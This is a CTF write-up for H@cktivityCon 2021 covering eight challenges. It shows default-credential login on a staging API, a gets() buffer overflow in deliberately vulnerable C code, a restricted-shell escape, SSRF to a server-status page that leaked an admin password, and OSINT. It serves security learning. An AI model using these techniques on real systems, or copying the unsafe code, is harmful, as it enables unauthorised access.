---
layout: default
title: H@cktivityCon 2021 CTF
---

{:.warning-header}
## These CTF write-ups contain spoilers

### Written: 2021/09/20

---

This was a 48-hour CTF compromising of a variety of challenges including web, cryptography and applications. The majority of these challenges were solved with team member **wombo**.

## Bass64
### Challenge notes

{:.blockquote-style}
It, uh... looks like someone bass-boosted this? Can you make any sense of it?

We are instructed to download a file - `bass64` for this challenge. A few simple checks on the downloaded file as well as its content shows us a jumble of ASCII characters:

```shell
file bass64
bass64: ASCII text, with very long lines
cat bass64
```

<img src="/assets/images/bass64_challenge_cat.png">

I initially tried a number of ideas, such as stripping the whitespace to see if a message appeared in a clearer form, however this was to no avail. The characters looked like they would yield a message so we eventually started to look at how we can make it clearer.

wombo pulled the text up in a text editor and started to zoom out until the text became clearer:

<img src="/assets/images/bass64_challenge_text.png">

As the challenge name indicated, I suspected this was encoded in **base64** therefore I attempted to decode it, which gave us our first flag:


<details>
<summary>Flag</summary>
<div>
<pre><code>echo "IGZsYWd7MzVhNWQxM2RhNmEyYWZhMGM2MmJmY2JkZDYzMDFhMGF9" | base64 -d
 flag{35a5d13da6a2afa0c62bfcbdd6301a0a}</code></pre>
</div>
</details>

## Swaggy
### Challenge notes

{:.blockquote-style}
This API documentation has all the swag

With this challenge we were presented with a simple API documentation:

<img src="/assets/images/swaggy_challenge_front_end.png">

When we expand the information on the `GET` request, we get some additional instructions on how to use the API including what the response will look like on a successful request. In the first screenshot, there is a button for **Authorize**. This allows us to enter a username and password and just below it we have a button called **Try it out**. Hitting that builds a query to the API with the necessary headers and the authorization header generated from the username and password.

<img src="/assets/images/swaggy_challenge_api_expended.png">

I also noticed there is a dropdown to select the server. We can toggle between `api.congon4tor.com/v1/flag`, which is the production server as well as `staging-api.congon4tor.com:7777`, which is their staging server.

I had no successful results for the production server and started to think how all the pieces fit together and if the challenge could be a misconfigured or loosely set up staging server. I started using basic username and password combinations, such as `admin:password`, `admin:test` and such. On one of the attempts, the combination of `admin:admin` worked on the staging server, yielding our flag:

<details>
<summary>Flag</summary>
<div>
<pre><code>curl -X 'GET' \
  'http://staging-api.congon4tor.com:7777/flag' \
  -H 'accept: application/json' \
  -H 'Authorization: Basic YWRtaW46YWRtaW4='
{"flag":"flag{e04f962d0529a4289a685112bf1dcdd3}"}
</code></pre>
</div>
</details>

## Butter Overflow
### Challenge notes

{:.blockquote-style}
Can you overflow this right?

This challenge has us download a number of files: `Makefile`, `source.c` and `butter_overflow`:

```shell
file butter_overflow
butter_overflow: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f9d42ef66d8218f0514030a2fae48b91206f9a34, for GNU/Linux 3.2.0, not stripped
file Makefile
Makefile: makefile script text, ASCII text
file source.c
source.c: c program text, ASCII text
```

Looking at the `Makefile`, we can see that the `source.c` file gets compiled to the `butter_overflow` file:

```c
all:
	gcc -fno-stack-protector source.c -o butter_overflow
```

Reviewing the `source.c` file would give us a good idea of what the code is doing and this is revealed in the `main()` function:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/stat.h>

void give_flag();

void handler(int sig) {
    if (sig == SIGSEGV)
        give_flag();
}

void give_flag() {
    char *flag = NULL;
    FILE *fp = NULL;
    struct stat sbuf;

    if ((fp = fopen("flag.txt", "r")) == NULL) {
        puts("Could not open flag file.");
        exit(EXIT_FAILURE);
    }

    fstat(fileno(fp), &sbuf);

    flag = malloc(sbuf.st_size + 1);
    if (flag == NULL) {
        puts("Failed to allocate memory for the flag.");
        exit(EXIT_FAILURE);
    }

    fread(flag, sizeof(char), sbuf.st_size, fp);
    flag[sbuf.st_size] = '\0';

    puts(flag);

    fclose(fp);
    free(flag);

    exit(EXIT_SUCCESS);
}

int main() {
    char buffer[0x200];

    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    signal(SIGSEGV, handler);

    puts("How many bytes does it take to overflow this buffer?");
    gets(buffer);

    return 0;
}
```

The argument `buffer` allows for the HEX value `0x200`, which is **512** in decimal. When the program runs, we get asked the question, *How many bytes does it take to overflow this buffer?* and the program then accepts input that is assigned to the `buffer` variable. Outside of the `mail()` function we can see other functions such the `handler()` function, which gets called if the program has a signal for memory access violation (`SIGSEGV`). If there is, the `give_flag()` function is called.

Since I couldn't find any validation for the `buffer` variable, I had a feeling if we provide it more than **%12** characters, we will achieve the memory violation and end up with a buffer overflow. The challenge has us connect to a remote server to interact with the application:

<details>
<summary>Flag</summary>
<div>
<pre><code>nc challenge.ctf.games 30054
How many bytes does it take to overflow this buffer?
iwtabmdbtrboztzgyoeiajvhbcceayolgegbzoxnhsamzmdqgwodkoqxlaamvfcrgpwxbcfaeqsavjzyjgsdftbfiwnaiujjwtcgycgyclbfoqvqfcnqgaooaekxbywvodtqwzwkuafnqasmolzmhabduoyvzjbnfvvwwdempilvajczdcfgjgtdgrbdhovfmdbeqecphdhkoqepxhehcveddetkyoznjhwtjmoaokxqjfzfepppangcoluiakoxgcpxwhmufocokwllbwzqvuyrwbmxgkokxmunonygzaevgocxjenvmylmzqvztyhorywyjfnfurfgzeitjeeuslegkjtibywkzcjztdxxxnpllroptmxsuxroxxwizaxrmonnuugwotgtndpczbhhdnvxddkbqvlyvvzptpdmvxrcgtopasbmuargfkryxdspsqpfobiroxssasckqiynqgiyozrkxkqyvwpsfycsjlngzxuotndwarzwpbddovofecnutfrkjikangexxt
flag{72d8784a5da3a8f56d2106c12dbab989}</code></pre>
</div>
</details>

The above string was a random **530** byte string that I generated and we can see the flag returned at the bottom.

## Bad Words
### Challenge notes

{:.blockquote-style}
You look questionable... if you don't have anything good to say, don't say anything at all!

This challenge had us connect to a remote server and we were given the prompt `user@host:/home/user$`. Depending on the command you typed, you would get various responses but not the expected output:

```shell
user@host:/home/user$ cat flag
cat flag
You said a bad word, "c++"!!
user@host:/home/user$ getfacl ./*
getfacl ./*
You said a bad word, "g++"!!
```

Tried a number of different commands to see if we could either get a listing of the directory or at least the output of files that were present. Nothing worked as expected. We next tried to see what would happen if we started a new shell session:

```shell
user@host:/home/user$ /bin/sh
/bin/sh
ls -lah
total 32K
dr-xr-xr-x 1 nobody nogroup 4.0K Sep  9 19:47 .
drwxr-xr-x 1 user   user    4.0K Sep  9 19:47 ..
-rw-r--r-- 1 nobody nogroup  220 Sep  9 19:47 .bash_logout
-rwxr-xr-x 1 user   user     12K Sep  9 19:47 .bashrc
-rw-r--r-- 1 nobody nogroup  807 Sep  9 19:47 .profile
drwxr-xr-x 1 user   user    4.0K Sep  9 19:47 just
cd just
ls
out
cd out
ls
of
cd of
ls
reach
cd reach
ls
flag.txt
```

<details>
<summary>Flag</summary>
<div>
<pre><code>cat flag.txt
flag{2d43e30a358d3f30fe65cc47a9cbbe98}</code></pre>
</div>
</details>

As can be seen, that allowed us to execute `ls` and we found a directory that branched out to a number of sub directories until we got to our flag.

## 2ez
### Challege notes

{:.blockquote-style}
These warmups are just too easy! This one definitely starts that way, at least!

We are provided with a file to download, `2ez` and on inspection we get the following:

```shell
file 2ez
2ez: data
```

Looking at the file closer with `xxd` we can see this is intended to be an image file based on the `JFIF` header:

```shell
xxd 2ez
00000000: 2e32 455a 0010 4a46 4946 0001 0100 0001  .2EZ..JFIF......
```

[Fileinfo](https://fileinfo.com/extension/jfif) had this to say about it:

> A JFIF file is a bitmap graphic that uses JPEG compression. It is saved using a variation of the common .JPEG file format, designed to include a minimal amount of data and allow easy exchange across multiple platforms and applications.

Nothing interesting was returned with `strings` specifying the return must be at least 10 characters long, nor with `exiftool`:

```shell
strings -n 10 2ez
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDXw
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD_

exiftool 2ez
ExifTool Version Number         : 12.30
File Name                       : 2ez
Directory                       : .
File Size                       : 16 KiB
File Modification Date/Time     : 2021:09:16 22:06:02-05:00
File Access Date/Time           : 2021:09:16 22:06:29-05:00
File Inode Change Date/Time     : 2021:09:16 22:06:02-05:00
File Permissions                : -rw-r--r--
Error                           : Unknown file type
```

Digging around, wombo found a [table of file signatures](https://www.garykessler.net/library/file_sigs.html). When looking up JFIF we can see what the first few bytes should look like:

<img src="/assets/images/2ez_challenge_file_signature.png">

From our earlier `xxd` output, we can see that the first bytes do not match up. I would say the coolest thing I've learnt during this CTF challenge was that `vim` [can be used as a HEX editor](https://stackoverflow.com/questions/827326/whats-a-good-hex-editor-viewer-for-the-mac). With this knowledge, adjusting the header in the file to match the signature found for `JFIF` files should get us moving forward:

```shell
file 2ez
2ez: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 800x200, components 1
```

After adjusting the header, the file is now recognized as a `JPEG` file and we can open it to reveal the flag:

<details>
<summary>Flag</summary>
<div>
<img src="/assets/images/2ez_challenge_flag.png">
</div>
</details>

## Titanic
### Challenge notes

{:.blockquote-style}
Tee-Tech is a rising cyber security organization which creates tools and provide cyber security solution to it's clients, but are they themselves secure enough?

For this challenge we are given a URL to a website. Browsing around the site, we find a link to a URL capturer application, which gives us an input box where URLs can be entered and the application will take a screen capture and provide the results on the following URL: `http://challenge.ctf.games:31956/captures/captured.png`.

I've tried a number of options such without success:

```
challenge.ctf.games:31956/flag
challenge.ctf.games:31956/admin
challenge.ctf.games:31956/admin.php
challenge.ctf.games:31956/dashboard
challenge.ctf.games:31956/cpanel
challenge.ctf.games:31956/result
localhost/flag
127.0.0.1/flag
```

I've also tried a number of options indlucing some with `.txt` added to `flag` but no successful results returned. We did get some information returned though that if the image we were seeing was not working or loading, we may have blacklisted characters in our URL that may aid us down the line:

```
URL Capturer
Click.. Caught in 4K :P

Filtered URL - 127.0.0.1:80/flag
Captured URL can be found at here
In case of an error or the image being empty/doesn't change, you have blacklisted characters in your url..
```

I started to poke around the source code of the site when I saw that a link in the header was commented out:

```html
<body>

  <!-- ======= Header ======= -->
  <header id="header" class="fixed-top header-inner-pages">
    <div class="container d-flex align-items-center">

      <h1 class="logo me-auto"><a href="index.html">Tee-Tech</a></h1>

      <nav id="navbar" class="navbar">
        <ul>
          <li><a class="nav-link scrollto active" href="/index.html#hero">Home</a></li>
          <li><a class="nav-link scrollto" href="/index.html#about">About</a></li>
          <li><a class="nav-link scrollto" href="/index.html#services">Services</a></li>
          <li><a class="getstarted scrollto" href="/admin.php">Admin</a></li>
          <!-- <li><a class="getstarted scrollto" href="/server-status">Status</a></li> -->
        </ul>
        <i class="bi bi-list mobile-nav-toggle"></i>
      </nav><!-- .navbar -->

    </div>
  </header><!-- End Header -->
```

So looks like the link, `/server-status` is accessible. I tried to navigate to it directly but was met with a `403`:

<img src="/assets/images/titanic_challenge_403.png">

I then gave `localhost/server-status` a try in the URL checker:

<img src="/assets/images/titanic_challenge_url_checker.png">

Which gave us the following result:

<img src="/assets/images/titanic_challenge_server_status.png">

We can see a number requests which have come in to the site including a few requests to the `admin.php` page, including the username and password in plain text `/admin.php?uname=root&psw=EYNDR4NhadwX9rtef`. Visiting this URL yields us the flag:

<details>
<summary>Flag</summary>
<div>
<img src="/assets/images/titanic_challenge_flag.png">
</div>
</details>

## Jed Sheeran
### Challenge notes

{:.blockquote-style}
Oh we have another fan with a budding music career! Jed Sheeran is seemingly trying to produce new songs based off of his number one favorite artist... but it doesn't all sounds so good. Can you find him?

This is one of three OSINT challenges that needed some research. I tried a few Google searches such as `Jed Sheeran music` which came back with the a link to a Sound Cloud profile. This seemed promising:

<img src="/assets/images/jed_sheeran_challenge_google.png">

Opening the Sound Cloud page indicated we were on the right track (no pun intended). One of the songs - Beautiful People by Jed Sheeran looked to be out of place. Playing it was a high pitch tone which based on the sound waves was the full song:

<img src="/assets/images/jed_sheeran_challenge_soundcloud.png">

I noticed some comments on that music file so I went to check them out, and voila, we got our flag:

<details>
<summary>Flag</summary>
<div>
<img src="/assets/images/jed_sheeran_challenge_flag.png">
</div>
</details>

## Mike Shallot
### Challenge notes

{:blockquote-style}
Mike shallt is one shady fella. We are aware of him trying to share some specific intel, but hide it amongst the corners and crevices of the internet. Can you find his secret?

I went down some terrible rabbit holes on this one. I started out by Googling a number of combinations of the name with some keywords from the challenge notes. Early on I stumbled upon a mock site (`http://kiosk2.co.uk/f16-home-inspire/`), which had **F16** in its name. That then got me thinking whether the secret is relating to fighter jets and the rabbit hole went deeper. Needless to say, after some reverse image searches, Google and other social media tunnels, this was the **wrong path**.

Since Google didn't yield much I went onto checking whether he had any possible social media profiles. I used [Instant Usernames](https://instantusername.com/#/) for this and went through a number of sites. I eventually stumbled over a PasteBin profile for the use [mikeshallot](https://pastebin.com/WVUP8dRD):

<img src="/assets/images/mikeshallot_challenge_pastebin.png">

This seemed promising. Two random strings were provided so I started to research these. I found that `strongerw2ise74v3duebgsvug4mehyhlpa7f6kfwnas7zofs3kov7yd` related to a Tor hosted `.onion` website:

<img src="/assets/images/mikeshallot_challenge_google.png">

Firing up Tor and navigating to the URL, I tested out what a paste will look like, which indicated it uses a combination of two random strings split with a slash, much like the second string found originally. I used the fully URL given - `strongerw2ise74v3duebgsvug4mehyhlpa7f6kfwnas7zofs3kov7yd.onion/pduplowzp/nndw79` in Tor and got our flag:

<details>
<summary>Flag</summary>
<div>
<img src="/assets/images/mikeshallot_challenge_flag.png">
</div>
</details>

## End
Overall these were great challenges and I've learnt plenty. The most interesting thing as mentioned was using `vim` as a HEX editor. I look forward to reading up additional writeups from others for challenges that left me puzzled or where I came close to figuring it out but did not have a chance.




